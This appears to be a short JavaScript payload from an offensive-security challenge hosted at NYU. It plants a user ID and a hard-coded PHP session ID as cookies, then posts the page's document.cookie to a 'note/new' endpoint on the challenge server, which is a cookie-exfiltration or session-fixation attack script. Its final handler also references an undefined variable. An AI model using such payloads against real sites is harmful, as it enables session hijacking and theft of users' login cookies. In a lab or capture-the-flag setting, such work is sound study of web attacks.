document.cookie = "CHALBROKER_USER_ID=bh1642";
document.cookie = "PHPSESSID=inbdndc8l35c80fi1spdm1hpe4"

var formData = new FormData();
formData.append('title', 'test');
formData.append('content', document.cookie);
formData.append('submit', 'save');

fetch("http://offsec-chalbroker.osiris.cyber.nyu.edu:12345/note/new", {
    method: "POST",
    credentials: "same-origin",
    body: formData
}).then(res => {
    alert(response.json);
});
